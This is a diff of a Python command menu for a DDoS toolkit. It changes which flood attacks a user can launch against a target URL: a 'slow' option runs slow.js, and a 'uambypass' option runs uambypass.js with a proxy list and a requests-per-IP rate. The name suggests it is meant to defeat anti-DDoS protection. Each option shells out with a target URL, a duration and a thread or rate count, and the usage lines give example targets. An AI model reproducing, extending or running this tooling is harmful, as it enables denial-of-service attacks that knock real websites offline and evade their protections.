@@ -84,15 +84,14 @@ def main():
         elif cnc == "banner" or cnc == "BANNER" or cnc == "banners" or cnc == "BANNERS":
             ()
 
-        elif "https-spoof" in cnc:
+        elif "slow" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                thread = cnc.split()[3]
-                os.system(f'python3 https-spoof.py {url} {time} {thread}')
+                os.system(f'node slow.js {url} {time}')
             except IndexError:
-                print('Usage: https-spoof <url> <time> <threads>')
-                print('Example: https-spoof http://LeMinhTu.info 60 500')
+                print('Usage: slow <url> <time>')
+                print('Example: slow http://LeMinhTu.com 60')
                 
         elif "http-raw" in cnc:
             try:
@@ -103,14 +102,15 @@ def main():
                 print(Fore.LIGHTCYAN_EX +'Usage: http-raw <url> <time>')
                 print(Fore.LIGHTCYAN_EX +'Example: http-raw http://LeMinhTu.info/ 60')
 
-        elif "http-requests" in cnc:
+        elif "uambypass" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                os.system(f'node HTTP-REQUESTS {url} {time}')
+                per = cnc.split()[3]
+                os.system(f'node uambypass.js {url} {time} {per} http.txt')
             except IndexError:
-                print(Fore.RED +'Usage: http-requests <url> <time>')
-                print(Fore.RED +'Example: http-requests http://LeMinhTu.info/ 60')
+                print(Fore.RED +'Usage: uambypass <url> <time> <req_per_ip>')
+                print('Example: uambypass http://example.com 60 1250')
 
         elif "stress" in cnc:
             try:
